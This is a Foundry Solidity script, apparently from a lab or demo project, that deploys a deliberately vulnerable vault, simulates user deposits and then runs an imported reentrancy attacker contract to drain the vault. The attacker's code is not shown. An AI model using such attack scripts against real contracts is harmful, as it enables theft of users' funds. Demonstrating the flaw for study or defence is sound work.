// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/victim/VulnerableVault.sol";
import "../src/attacker/ReentrancyAttacker.sol";

contract RunAll is Script {
    function run() external {
        // Phase 1: Deploy
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");
        vm.startBroadcast(deployerKey);
        VulnerableVault vault = new VulnerableVault();
        console.log("Vault:", address(vault));
        vm.stopBroadcast();

        // Phase 2: Normal activity
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        vault.deposit{value: 5 ether}();
        vm.stopBroadcast();

        uint256 user2Key = vm.envUint("USER2_KEY");
        vm.startBroadcast(user2Key);
        vault.deposit{value: 3 ether}();
        vm.stopBroadcast();

        uint256 user3Key = vm.envUint("USER3_KEY");
        vm.startBroadcast(user3Key);
        vault.deposit{value: 10 ether}();
        vm.stopBroadcast();

        vm.startBroadcast(user1Key);
        vault.withdraw(1 ether);
        vm.stopBroadcast();

        // Phase 3: Attack
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        vm.startBroadcast(attackerKey);
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(vault));
        attacker.attack{value: 1 ether}();
        attacker.withdraw();
        console.log("Attack complete. Vault drained.");
        vm.stopBroadcast();
    }
}
